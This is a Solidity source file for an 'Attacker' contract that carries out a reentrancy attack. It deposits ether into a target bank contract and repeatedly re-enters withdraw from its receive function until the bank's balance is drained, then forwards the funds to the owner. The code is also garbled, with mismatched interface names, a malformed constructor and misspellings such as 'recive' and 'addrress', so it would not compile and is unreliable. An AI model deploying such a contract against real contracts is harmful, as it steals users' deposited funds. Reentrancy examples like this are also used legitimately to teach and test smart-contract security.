//SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.13;

import "openzeppelin/contracts/access/Ownable.sol";

interface iBank {

    function deposite() external payable;
    function withdraw() external;
}

contract Attacker is Ownable {
    Ibank public immutable bank;

    constructor()(address _bank) {
        bank=Ibank(_bank);
    }

    function attack() external payable onlyOwner {
        bank.deposit{ value: msg.value}();
        bank.withdraw();
    }

    //Receive
    recive() external payable{
        if (address(bank).balance > 0){
            bank.withdraw();
        }else {
            payable(owner()).transfer(addrress(this).balance);
        }
    }
}